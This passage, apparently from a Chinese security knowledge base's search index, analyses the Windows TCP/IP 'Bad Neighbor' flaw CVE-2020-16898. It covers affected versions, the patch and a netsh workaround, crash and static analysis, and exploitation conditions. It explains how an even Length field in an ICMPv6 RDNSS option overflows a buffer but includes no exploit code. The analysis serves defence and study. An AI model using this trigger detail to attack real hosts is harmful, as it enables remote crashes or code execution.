\u5728\u6d41\u91cf\u4e2d\u53ef\u4ee5\u660e\u663e\u770b\u51fa\uff0c\u7b2c\u4e00\u4e2aOption\u7ed3\u6784\u7684Address\u5b57\u6bb5\u9519\u8bef\u8bc6\u522b\u8ba1\u7b97\u4e86\u4e00\u4e2aRecursive DNS Server\u7684\u503c\uff1a \u7b2c1\u4e2aRecursive DNS Server\u7684\u5730\u5740\u4e3a0018-0027\uff0c\u540e\u7eed\u76848\u4e2a\u5b57\u8282\u4e0d\u5e94\u8be5\u518d\u8fdb\u884c\u8bc6\u522b\u3002\u9009\u4e2d\u7b2c2\u4e2aRecursive DNS Server\u65f6\u60c5\u51b5\u5982\u4e0b\uff1a \u7b2c2\u4e2aRecursive DNS Server\u7684\u5730\u5740\u4e3a0028-0037\u3002\u4f46\u662f\u8be516\u4e2a\u5b57\u8282\u4e2d\u7684\u540e8\u4e2a\u5b57\u8282\u5f88\u660e\u663e\u4e3a\u4e0b\u4e00\u4e2aICMPv6 Option\u7ed3\u6784\u7684\u5185\u5bb9\uff1a \u56db\u3001\u53c2\u8003\u6587\u732e https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 https://tools.ietf.org/html/rfc8106 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/","title":"CVE 2020 16898 Bad Neighbor  Windows TCPIP\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-16898%20Bad%20Neighbor%20%20Windows%20TCPIP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#cve-2020-16898-bad-neighbor-windows-tcpip","text":"\u8be5\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8eWindows TCP/IP\u5806\u6808\u5728\u5904\u7406\u9009\u9879\u7c7b\u578b\u4e3a25(0x19\uff0c\u9012\u5f52DNS\u670d\u52a1\u5668\u9009\u9879)\u4e14\u957f\u5ea6\u5b57\u6bb5\u503c\u4e3a\u5076\u6570\u7684ICMPv6\u7684\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u65f6\uff0c\u5904\u7406\u903b\u8f91\u5b58\u5728\u7eb0\u6f0f\uff0c\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668\uff08\u4e3b\u673a\u6216\u670d\u52a1\u5668\uff09\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u4e00\u3001\u6f0f\u6d1e\u4fe1\u606f 1. \u6f0f\u6d1e\u7b80\u8ff0 \u6f0f\u6d1e\u540d\u79f0\uff1aWindows TCP/IP Remote Code Execution Vulnerability \u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-16898 \u6f0f\u6d1e\u7c7b\u578b\uff1aDesign Weakness \u6f0f\u6d1e\u5f71\u54cd\uff1aCode Execution CVSS\u8bc4\u5206\uff1a9.8 \u5229\u7528\u96be\u5ea6\uff1aMedium \u57fa\u7840\u6743\u9650\uff1a\u4e0d\u9700\u8981 2. \u7ec4\u4ef6\u6982\u8ff0 TCP/IP\u662fInternet\u4e0a\u4f7f\u7528\u7684\u901a\u4fe1\u534f\u8bae\u3002 \u5728Windows\u7684\u65e9\u671f\u7248\u672c\u4e2d\uff0cTCP/IP\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u53ef\u9009\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u50cf\u5176\u4ed6\u4efb\u4f55\u534f\u8bae\u4e00\u6837\u5220\u9664\u6216\u6dfb\u52a0\u3002\u4eceWindows XP/Server 2003\u5f00\u59cb\uff0cTCP/IP\u6210\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3\u7ec4\u4ef6\uff0c\u65e0\u6cd5\u5220\u9664\u3002 \u5c06TCP/IP\u4f5c\u4e3aWindows\u7684\u6838\u5fc3\u7ec4\u4ef6\u662f\u975e\u5e38\u6709\u610f\u4e49\u7684\uff0c\u56e0\u4e3a\u5b83\u7684\u529f\u80fd\u5728Microsoft Windows Server\u4e0a\u5bf9\u7f51\u7edc\u64cd\u4f5c\u548cActive Directory\u57df\u73af\u5883\u5c24\u4e3a\u91cd\u8981\u3002 \u6574\u4e2aActive Directory\u67b6\u6784\u57fa\u4e8eDNS\u5c42\u6b21\u7ed3\u6784\uff0c\u4f9d\u8d56\u4e8eTCP/IP \u4f20\u8f93\u534f\u8bae \u3002 Microsoft Windows\u4e2d\u7684TCP/IP\u529f\u80fd\u5728\u5185\u6838\u7ea7\u522b\u8fd0\u884c\uff0c\u5e76\u7531\u9a71\u52a8\u7a0b\u5e8ftcpip.sys\u63d0\u4f9b\u3002\u8be5\u9a71\u52a8\u7a0b\u5e8f\u5904\u7406\u6240\u6709\u4f20\u5165\u548c\u4f20\u51fa\u7684TCP/IP\u901a\u4fe1\u4fe1\u606f\uff0c\u5305\u62ec\u89e3\u6790\u4ece\u7f51\u7edc\u63a5\u53e3\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\uff0c\u4ee5\u53ca\u89e3\u91ca\u6b64\u6570\u636e\u5e76\u5c06\u5176\u4f20\u9012\u7ed9\u66f4\u9ad8\u7ea7\u522b\u7684\u7ec4\u4ef6\u3002 3. \u6f0f\u6d1e\u5229\u7528 \u8be5\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8eWindows TCP/IP\u5806\u6808\u5728\u5904\u7406\u9009\u9879\u7c7b\u578b\u4e3a25(0x19\uff0c\u9012\u5f52DNS\u670d\u52a1\u5668\u9009\u9879)\u4e14\u957f\u5ea6\u5b57\u6bb5\u503c\u4e3a\u5076\u6570\u7684ICMPv6\u7684\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u65f6\uff0c\u5904\u7406\u903b\u8f91\u5b58\u5728\u7eb0\u6f0f\uff0c\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668(\u4e3b\u673a\u6216\u670d\u52a1\u5668)\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 4. \u6f0f\u6d1e\u5f71\u54cd Microsoft Windows 10 1709 Microsoft Windows 10 1803 Microsoft Windows 10 1809 Microsoft Windows 10 1903 Microsoft Windows 10 1909 Microsoft Windows 10 2004 Microsoft Windows Server 2019 Microsoft Windows Server, version 1903 Microsoft Windows Server, version 1909 Microsoft Windows Server, version 2004 5. \u89e3\u51b3\u65b9\u6848 \u5b98\u65b9\u89e3\u51b3\u65b9\u6848\uff1a\u5fae\u8f6f\u5b98\u65b9\u9488\u5bf9\u8be5\u6f0f\u6d1e\u5df2\u53d1\u5e03\u5b89\u5168\u66f4\u65b0\u8865\u4e01\uff0c\u8865\u4e01\u5730\u5740\uff1a https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 \u4e34\u65f6\u89e3\u51b3\u65b9\u6848\uff1a \u7ba1\u7406\u5458\u542f\u52a8powershell\u6216cmd\uff0c\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5\u6240\u6709\u7f51\u7edcIPv6\u63a5\u53e3\u7684\u5217\u8868\u4ee5\u53ca\u76f8\u5e94\u7684\u7d22\u5f15\u53f7\uff1a netsh int ipv6 sh int \u6837\u4f8b\u8f93\u51fa\u5982\u4e0b\uff1a \u786e\u8ba4\u7f51\u7edc\u63a5\u53e3\u7684RDNSS\u529f\u80fd\u5f00\u542f\u60c5\u51b5\uff1a netsh int ipv6 sh int Idx number \u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5173\u95edRDNSS\u529f\u80fd(\u5c06Idx number\u66ff\u6362\u4e3a\u8981\u5173\u95ed\u7684\u7f51\u7edc\u63a5\u53e3\u7684Idx\u503c)\uff1a netsh int ipv6 set int Idx number rabaseddnsconfig=disable \u6837\u4f8b\u8f93\u51fa\u5982\u4e0b\uff1a \u6b64\u65f6\u518d\u6b21\u786e\u8ba4\u63a5\u53e3\u7684RDNSS\u5f00\u542f\u60c5\u51b5\uff0cRDNSS\u529f\u80fd\u5df2\u88ab\u5173\u95ed\uff1a \u4e8c\u3001\u6f0f\u6d1e\u590d\u73b0 1. \u73af\u5883\u642d\u5efa l \u9776\u673a\uff1aWindows 10 1809 x64 l \u9776\u673a\u64cd\u4f5c\uff1a\u65e0\u9700\u4efb\u4f55\u64cd\u4f5c\uff0c\u53ef\u6b63\u5e38\u4e0e\u653b\u51fb\u673a\u901a\u4fe1\u5373\u53ef 2. \u590d\u73b0\u8fc7\u7a0b \\1. \u901a\u8fc7\u5404\u79cd\u624b\u6bb5\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684IPv6\u5730\u5740\u548cMAC\u5730\u5740(\u5177\u4f53\u65b9\u6cd5\u53ef\u81ea\u884c\u63a2\u7d22\uff0c\u8f83\u4e3a\u7b80\u5355) \\2. \u653b\u51fb\u673apython3\u8fd0\u884cpoc\uff1a \\3. \u9776\u673acrash\uff1a \u4e09\u3001\u6f0f\u6d1e\u5206\u6790 1. \u57fa\u672c\u4fe1\u606f \u6f0f\u6d1e\u6587\u4ef6\uff1atcpip.sys \u6f0f\u6d1e\u51fd\u6570\uff1aIpv6pUpdateRDNSS()\u51fd\u6570 \u6f0f\u6d1e\u5bf9\u8c61\uff1aICMPv6\u8def\u7531\u5e7f\u64ad\u4e2d\u7684option\u7ed3\u6784 2. \u80cc\u666f\u77e5\u8bc6 \u9650\u4e8e\u7bc7\u5e45\u95ee\u9898\uff0c\u6b64\u5904\u4e0d\u5bf9\u7528\u4e8eDNS\u914d\u7f6e\u7684IPv6\u8def\u7531\u5e7f\u64ad\u8fdb\u884c\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u66f4\u8be6\u7ec6\u8d44\u6599\u53ef\u53c2\u8003RFC8106\u3002 1. \u57fa\u672c\u77e5\u8bc6 IPv6 Router Advertisment (RA) options\uff0c\u4e5f\u79f0\u4e3aDNS RA options\uff0c\u5141\u8bb8IPv6\u7684\u8def\u7531\u5668\u5411IPv6\u7684\u4e3b\u673a\u5e7f\u64adDNS Recursive Server Address(DNS\u9012\u5f52\u8def\u7531\u5668\u5730\u5740)\u5217\u8868\u548cDNS Search List(DNS\u641c\u7d22\u5217\u8868)\uff0c\u5176\u4e3b\u8981\u7528\u9014\u4e3a\u5728IPv6\u7684\u4e3b\u673a\u4e0a\u8fdb\u884cDNS\u540d\u79f0\u89e3\u6790\u4ee5\u53ca\u57df\u540e\u7f00\u7684\u5904\u7406\u3002 IPv6 Neighbor Discovery(ND\uff0cIPv6\u90bb\u5c45\u53d1\u73b0)\u548cIPv6 Stateless Address Autoconfiguratioin(SLAAC\uff0cIPv6\u65e0\u72b6\u6001\u5730\u5740\u81ea\u52a8\u914d\u7f6e)\u63d0\u4f9b\u4e86\u4f7f\u7528\u4e00\u4e2a\u6216\u591a\u4e2aIPv6\u5730\u5740\uff0c\u9ed8\u8ba4\u8def\u7531\u5668\u4ee5\u53ca\u4e00\u4e9b\u5176\u4ed6\u53c2\u6570\u914d\u7f6e\u56fa\u5b9a\u8282\u70b9\u6216\u79fb\u52a8\u8282\u70b9\u7684\u65b9\u6cd5\u3002 \u5f53\u6f2b\u6e38\u4e3b\u673a\u6bcf\u6b21\u8fde\u63a5\u5230\u53e6\u4e00\u4e2a\u7f51\u7edc\u65f6\uff0c\u65e0\u6cd5\u8fdb\u884c\u624b\u52a8\u914d\u7f6e\u3002 \u867d\u7136\u53ef\u4ee5\u8fdb\u884c\u9759\u6001\u914d\u7f6e\uff0c\u4f46\u662f\u5728\u8bf8\u5982\u7b14\u8bb0\u672c\u7535\u8111\u4e4b\u7c7b\u7684\u901a\u7528\u4e3b\u673a\u4e0a\u901a\u5e38\u4e0d\u5efa\u8bae\u8fd9\u6837\u64cd\u4f5c\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u4e3b\u673a\u8fd0\u884c\u76f4\u63a5\u8fde\u63a5\u5230\u5168\u5c40DNS\u7684\u81ea\u5df1\u7684\u9012\u5f52\u540d\u79f0\u670d\u52a1\u5668\uff0c\u90a3\u4e48\u672c\u5730\u5b9a\u4e49\u7684\u540d\u79f0\u7a7a\u95f4\u5bf9\u4e3b\u673a\u6765\u8bf4\u5c31\u4e0d\u53ef\u7528\u4e86\u3002 \u8bbf\u95eeDNS\u662f\u51e0\u4e4e\u6240\u6709\u4e3b\u673a\u7684\u57fa\u672c\u8981\u6c42\uff0c\u56e0\u6b64IPv6 SLAAC\u5728\u6ca1\u6709\u4efb\u4f55DNS\u914d\u7f6e\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u5728\u4efb\u4f55\u5b9e\u9645\u7684\u7f51\u7edc\u73af\u5883\u4e2d\u5355\u72ec\u4f5c\u4e3a\u66ff\u4ee3\u90e8\u7f72\u6a21\u578b\u3002 \u5bf9\u4e8eIPv4\u73af\u5883\u4e2d\u7684DNS\u670d\u52a1\u5668\u6765\u8bf4\uff0c\u8fd9\u4e9b\u95ee\u9898\u90fd\u5f88\u5bb9\u6613\u89e3\u51b3\u3002\u4f46\u662f\u5bf9\u4e8eIPv6\u7684\u7f51\u7edc\u73af\u5883\uff0c\u8fd9\u4e9b\u95ee\u9898\u663e\u5f97\u6bd4\u8f83\u68d8\u624b\u3002\u56e0\u6b64\uff0cRFC8106\u5b9a\u4e49\u4e86\u4e00\u79cd\u57fa\u4e8eDNS RA\u9009\u9879\u7684\u673a\u5236\uff0c\u4ee5\u5141\u8bb8IPv6\u4e3b\u673a\u6267\u884c\u81ea\u52a8DNS\u914d\u7f6e\u3002 \u5728\u901a\u8fc7IPv6 SLAAC\u81ea\u52a8\u914d\u7f6eIPv6\u4e3b\u673a\u5730\u5740\u5e76\u4e14\u6ca1\u6709DHCPv6\u57fa\u7840\u7ed3\u6784\u6216\u4e00\u4e9b\u4e3b\u673a\u6ca1\u6709DHCPv6\u5ba2\u6237\u7aef\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u4f5c\u4e3a\u66ff\u4ee3\u3002 \u4f46\u662f\uff0c\u5bf9\u4e8e\u9700\u8981\u5206\u53d1\u5176\u4ed6\u4fe1\u606f\u7684\u7f51\u7edc\uff0c\u53ef\u80fd\u4ecd\u7136\u4f1a\u4f7f\u7528DHCPv6\u3002 \u5728\u8fd9\u4e9b\u7f51\u7edc\u4e2d\uff0c\u53ef\u80fd\u4e0d\u9700\u8981\u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u3002 \u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u5141\u8bb8IPv6\u4e3b\u673a\u83b7\u53d6\u4e3b\u673a\u8fde\u63a5\u5230\u7684\u94fe\u63a5\u7684DNS\u914d\u7f6e(\u5373DNS\u9012\u5f52\u670d\u52a1\u5668\u5730\u5740\u548cDNSSL)\u3002 \u6b64\u5916\uff0c\u4e3b\u673a\u4f1a\u4ece\u63d0\u4f9b\u94fe\u63a5\u914d\u7f6e\u4fe1\u606f\u7684\u540c\u4e00RA\u6d88\u606f\u4e2d\u5b66\u4e60\u6b64DNS\u914d\u7f6e\u3002 2. \u540d\u8bcd\u89e3\u91ca Recursive DNS Server (RDNSS)\uff1a\u9012\u5f52DNS\u670d\u52a1\u5668\uff0c\u63d0\u4f9b\u9012\u5f52DNS\u89e3\u6790\u670d\u52a1\u7684\u670d\u52a1\u5668\uff0c\u7528\u4e8e\u5c06\u57df\u540d\u8f6c\u6362\u4e3aIP\u5730\u5740\u6216\u89e3\u6790\u6210RFC1034\u548cRFC1035\u4e2d\u5b9a\u4e49\u7684PTR\u8bb0\u5f55\u3002 RDNSS Option\uff1a\u4e00\u4e2a\u7528\u4e8e\u5411IPv6\u4e3b\u673a\u4f20\u9001RDNSS\u4fe1\u606f\u7684IPv6\u7684RA option\u3010RFC4861\u3011\u3002 DNS Search List (DNSSL)\uff1aPv6\u4e3b\u673a\u5728\u6267\u884cDNS\u67e5\u8be2\u641c\u7d22\u65f6\u4f7f\u7528\u7684DNS\u540e\u7f00\u57df\u540d\u5217\u8868\uff0c\u7528\u4e8e\u641c\u7d22\u7b80\u77ed\u7684\u4e0d\u5408\u683c\u57df\u540d\u3002 DNSSL Option\uff1a\u4e00\u4e2aIPv6 RA\u9009\u9879\uff0c\u7528\u4e8e\u5c06DNSSL\u4fe1\u606f\u4f20\u9012\u5230IPv6\u4e3b\u673a\u3002 3. \u8be6\u7ec6\u5206\u6790 \\1. \u57fa\u7840\u5206\u6790 RFC8106\u6807\u51c6\u5316\u4e86RDNSS option\uff0c\u5176\u4e2d\u5305\u542bRDNSSes\u7684\u5730\u5740\u3002\u8be5\u4fe1\u606f\u4f7f\u7528\u73b0\u6709ND message(\u4f8b\u5982RA)\u4f5c\u4e3a\u8f7d\u4f53\u3002IPv6\u4e3b\u673a\u53ef\u4ee5\u901a\u8fc7RA\u6d88\u606f\u914d\u7f6e\u4e00\u4e2a\u6216\u591a\u4e2aRDNSS\u7684IPv6\u5730\u5740\u3002 (1) \u90bb\u5c45\u53d1\u73b0\u6269\u5c55 RFC8106\u4e2d\u5b9a\u4e49\u7684\u5728\u90bb\u5c45\u53d1\u73b0\u4e2d\u4f7f\u7528\u7684IPv6 DNS\u914d\u7f6e\u7b97\u6cd5\u9700\u8981\u7528\u52302\u79cdND options\uff1aRDNSS option\u548cDNSSL option\u3002\u4e0e\u8be5\u6f0f\u6d1e\u76f8\u5173\u7684\u662fRDNSS option\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u4e0e CVE-2020-16899\u76f8\u5173\u3002 (2)RDNSS Option Structure RDNSS option\u603b\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a \u5bf9\u4e8eLength\u5b57\u6bb5\uff0c\u5982\u679c\u8be5\u9009\u9879\u4e2d\u4ec5\u5305\u542b\u4e00\u4e2aIPv6\u5730\u5740\uff0c\u5219\u6700\u5c0f\u503c\u4e3a3\u3002 \u6bcf\u589e\u52a0\u4e00\u4e2aRDNSS\u5730\u5740\uff0c\u957f\u5ea6\u5c31\u4f1a\u589e\u52a02\u3002\u63a5\u6536\u7684\u4e3b\u673a\u4f7f\u7528\u8be5\u5b57\u6bb5\u6765\u786e\u5b9a\u9009\u9879\u4e2dIPv6\u5730\u5740\u7684\u6570\u91cf\u3002 (3)Procedure in IPv6 Hosts \u5f53\u4e3b\u673a\u63a5\u6536\u5230RA\u6d88\u606f\u4e2d\u7684DNS\u7684options\u65f6\uff0c\u5176\u5904\u7406\u8fc7\u7a0b\u5982\u4e0b\uff1a \u9996\u5148\u68c0\u67e5Lengh\u5b57\u6bb5\u7684\u5408\u6cd5\u6027\uff1a\u662f\u5426\u5927\u4e8e\u7b49\u4e8e\u6700\u5c0f\u503c3\uff0c\u4ee5\u53ca\u662f\u5426\u6ee1\u8db3(Length - 1) % 2 == 0; \u5bf9\u4e8eRDNSS option\uff0c\u8fd8\u4f1a\u68c0\u67e5Address\u5b57\u6bb5\u662f\u5426\u4e3a\u4e00\u4e2a\u5355\u64ad\u5730\u5740; \u5982\u679c\u4ee5\u4e0a\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u4e3b\u673a\u5e94\u6309\u987a\u5e8f\u5c06\u9009\u9879\u7684\u503c\u590d\u5236\u5230DNS\u5b58\u50a8\u5e93\u548c\u89e3\u6790\u5668\u5b58\u50a8\u5e93\u4e2d\u3002 \u5426\u5219\uff0c\u4e3b\u673a\u5fc5\u987b\u4e22\u5f03\u8fd9\u4e9b\u9009\u9879\u3002 (4)Crash\u5206\u6790 \u9996\u5148\u5206\u6790dmp\u6587\u4ef6\uff0c\u67e5\u770bcrash\u73b0\u573a\uff1a \u5e76\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u7684\u8f83\u4e3a\u6709\u4ef7\u503c\u7684Call Stack\u4fe1\u606f\uff0c\u4f46\u662f\u53d1\u73b0\u6700\u7ec8\u7684crash\u539f\u56e0\u7684\u662fGS\u673a\u5236\u7684Security Cookie\u6821\u9a8c\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u8bf4\u8be5\u503c\u88ab\u8986\u76d6\u6389\u4e86\u3002\u90a3\u4e48\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u4e2a\u6ea2\u51fa\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u53ea\u53d1\u73b0\u4e86tcpip!Ipv6pHandleRouterAdvertisement+0x1269\u51fd\u6570\uff0c\u518d\u5f80\u540e\u5c31\u76f4\u63a5\u62a5gsfailure\u4e86\u3002 \\2. \u9759\u6001\u5206\u6790 \u5206\u6790\u4f7f\u7528\u7684\u6587\u4ef6\u4e3aWindows 10 1809 x64\u7684tcpip.sys\u6587\u4ef6\uff0c\u7248\u672c\u4e3a10.0.17763.316\u3002 (1)\u51fd\u6570\u8c03\u7528\u94fe \u6839\u636ecrash\u73b0\u573a\u4fe1\u606f\uff0c\u83b7\u53d6\u5230\u5173\u952e\u51fd\u6570tcpip!Ipv6pHandleRouterAdvertisement()\uff0c\u9996\u5148\u786e\u8ba4\u8be5\u51fd\u6570\u5230\u6f0f\u6d1e\u51fd\u6570\u7684\u524d\u540e\u8c03\u7528\u94fe\u3002 \u9996\u5148\u67e5\u770b\u5176\u4ea4\u53c9\u5f15\u7528\u5173\u7cfb\uff1a \u5176\u4e0a\u5c42\u8c03\u7528\u51fd\u6570\u4e3aIcmpv6ReceiveDatagrams()\uff0c\u8ddf\u8fdb\uff0c\u5e76\u67e5\u770b\u4ea4\u53c9\u5f15\u7528\u5173\u7cfb\uff1a \u6ca1\u6709\u518d\u53d1\u73b0\u663e\u5f0f\u7684\u51fd\u6570\u8c03\u7528\u3002\u8f6c\u800c\u5411tcpip!Ipv6pHandleRouterAdvertisement()\u7684\u4e0b\u5c42\u641c\u7d22\uff1a \u53d1\u73b0\u6f0f\u6d1e\u51fd\u6570\u8c03\u7528\u3002\u81f3\u6b64\uff0c\u51fd\u6570\u8c03\u7528\u94fe\u53ef\u4ee5\u7b80\u5355\u6982\u62ec\u4e3a\uff1a Icmpv6ReceiveDatagrams() -> tcpip!Ipv6pHandleRouterAdvertisement() -> Ipv6pUpdateRDNSS() (2)\u6f0f\u6d1e\u51fd\u6570\u5206\u6790 \u7ecf\u8fc7\u7b80\u5355\u5206\u6790\u53ef\u4ee5\u660e\u786e\uff0c\u8c03\u7528\u94fe\u7684\u9876\u5c42\u51fd\u6570Icmpv6ReceiveDatagrams()\u6ca1\u6709\u53d1\u73b0\u5b9e\u8d28\u6027\u7684\u4e0e\u8be5\u6f0f\u6d1e\u76f8\u5173\u7684\u5904\u7406\u4ee3\u7801\uff0c\u800c\u5728tcpip!Ipv6pHandleRouterAdvertisement() \u51fd\u6570\u4e2d\u53d1\u73b0\u4e86\u5bf9\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\u7684\u8c03\u7528\u3002\u6839\u636ecrash\u5206\u6790\uff0c\u6700\u540e\u62a5\u4e86gsfailure\uff0c\u800c\u4e14\u5173\u952e\u51fd\u6570\u4e3atcpip!Ipv6pHandleRouterAdvertisement()\uff0c\u5728\u8be5\u51fd\u6570\u7684\u8d77\u59cb\u4f4d\u7f6e\u786e\u5b9e\u53d1\u73b0\u4e86GS\u6821\u9a8c\uff1a \u90a3\u4e48\u5f88\u6709\u53ef\u80fd\u662f\u5728\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\u4e2d\u53d1\u751f\u4e86\u6ea2\u51fa\uff0c\u5bfc\u81f4\u4e86\u5176\u8c03\u7528\u51fd\u6570tcpip!Ipv6pHandleRouterAdvertisement()\u7684GS\u6821\u9a8c\u5931\u8d25\u3002 \u8fdb\u5165\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\uff1a \u9996\u5148\u83b7\u53d6\u5230RDNSS option\u7ed3\u6784\uff0c\u7136\u540e\u8bfb\u53d6Length\u5b57\u6bb5\u6765\u8ba1\u7b97Address\u5b57\u6bb5\u6709\u51e0\u4e2aAddress\u503c\u3002 \u786e\u8ba4\u6709\u591a\u5c11Address\u4e4b\u540e\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5bf9\u6bcf\u4e2aAddress\u8fdb\u884c\u5904\u7406\uff0c\u6700\u5173\u952e\u7684\u662f\u5206\u914d\u5408\u9002\u7684\u5185\u5b58\u3002\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u5224\u65ad\uff0c\u5982\u679c\u4e0d\u662f\u5355\u64ad\u5730\u5740\uff0c\u76f4\u63a5\u5ffd\u7565\u3002 \u5728\u8fdb\u884c\u5904\u7406\u65f6\uff0c\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff1a\u5047\u8bbeLength\u7684\u957f\u5ea6\u4e3a4\uff0c\u90a3\u4e48\u8ba1\u7b97\u7ed3\u675f\u4e4b\u540e\uff0cAddressCount\u7684\u503c\u5e94\u8be5\u4e3a1\u3002\u6b64\u65f6\uff0c\u6309\u7167\u6b63\u5e38\u903b\u8f91\uff0cIpv6pUpdateRDNSS()\u51fd\u6570\u5e94\u8be5\u589e\u52a032\u5b57\u8282(4*8)\u7684\u7f13\u51b2\u533a\uff0c\u4f46\u662f\u540e\u7eed\u5728\u5206\u914d\u7f13\u51b2\u533a\u65f6\u53ea\u5206\u914d\u4e8624\u5b57\u8282\uff1asizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u7f13\u51b2\u533a\u7684\u6ea2\u51fa\u3002 \u6839\u636eRFC8106\u7684\u6807\u51c6\uff0cLength\u5b57\u6bb5\u7684\u503c\u5e94\u8be5\u6ee1\u8db3\u6700\u5c0f\u4e3a3\u7684\u5947\u6570\u7684\u60c5\u51b5\u3002\u5f53\u63d0\u4f9b\u4e00\u4e2a\u5076\u6570Length\u503c\u65f6\uff0cWindows TCP/IP\u5806\u6808\u9519\u8bef\u5730\u5c06buffer\u524d\u8fdb\u4e868\u4e2a\u5b57\u8282\u3002\u8fd9\u4e3b\u8981\u662f\u56e0\u4e3a\u5806\u6808\u5728\u5185\u90e8\u4ee516\u5b57\u8282\u4e3a\u589e\u91cf\u8fdb\u884c\u8ba1\u6570\uff0c\u5e76\u4e14\u6ca1\u6709\u4f7f\u7528\u975eRFC\u517c\u5bb9\u957f\u5ea6\u503c\u7684\u5904\u7406\u4ee3\u7801\u3002\u8fd9\u79cd\u4e0d\u5339\u914d\u5bfc\u81f4\u5806\u6808\u5c06\u5f53\u524d\u9009\u9879\u7684\u6700\u540e8\u4e2a\u5b57\u8282\u89e3\u91ca\u4e3a\u7b2c\u4e8c\u4e2a\u9009\u9879\u7684\u5f00\u59cb\uff0c\u6700\u7ec8\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u6f5c\u5728\u7684RCE\u3002 4. \u5229\u7528\u601d\u8def \\1. \u5229\u7528\u6761\u4ef6 \u57fa\u672c\u6761\u4ef6 attacker\u9700\u8981\u83b7\u53d6target\u7684IPv6\u548cMAC\u5730\u5740 \u89e6\u53d1\u8fc7\u7a0b attacker\u9700\u8981\u642d\u914d\u5176\u4ed6\u5185\u5b58\u6cc4\u6f0f\u6216\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u6765\u5b9e\u73b0RCE attacker\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7tcpip.sys\u7684GS\u4fdd\u62a4\u673a\u5236 \\2. \u5229\u7528\u8fc7\u7a0b attacker\u76f4\u63a5\u53d1\u9001\u7279\u5236\u7684ICMPv6\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u7ed9target\uff1a [ Attacker ] \\3. \u653b\u51fb\u5411\u91cf \u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u5229\u7528IPv6\u76f4\u63a5\u53d1\u9001\u653b\u51fb\u6570\u636e\u5305\u5373\u53ef\u3002 5. \u6d41\u91cf\u5206\u6790 \u56e0\u4e3a\u8be5\u6f0f\u6d1e\u76f4\u63a5\u8d70\u7684IPv6\uff0c\u6240\u4ee5\u5bf9\u4e8e\u4e00\u4e9b\u90e8\u7f72\u5728IP\u5c42\u4ee5\u4e0a\u7684\u9632\u706b\u5899\u65b9\u6848\u5c31\u65e0\u6cd5\u9488\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u6d41\u91cf\u68c0\u6d4b\uff0c\u4f46\u662f\u5177\u5907IP\u5c42\u6d41\u91cf\u68c0\u6d4b\u7684\u9632\u706b\u5899\u53ef\u4ee5\u8f7b\u677e\u68c0\u6d4b\u6076\u610f\u6d41\u91cf\uff1a \u5728\u6d41\u91cf\u4e2d\u53ef\u4ee5\u660e\u663e\u770b\u51fa\uff0c\u7b2c\u4e00\u4e2aOption\u7ed3\u6784\u7684Address\u5b57\u6bb5\u9519\u8bef\u8bc6\u522b\u8ba1\u7b97\u4e86\u4e00\u4e2aRecursive DNS Server\u7684\u503c\uff1a \u7b2c1\u4e2aRecursive DNS 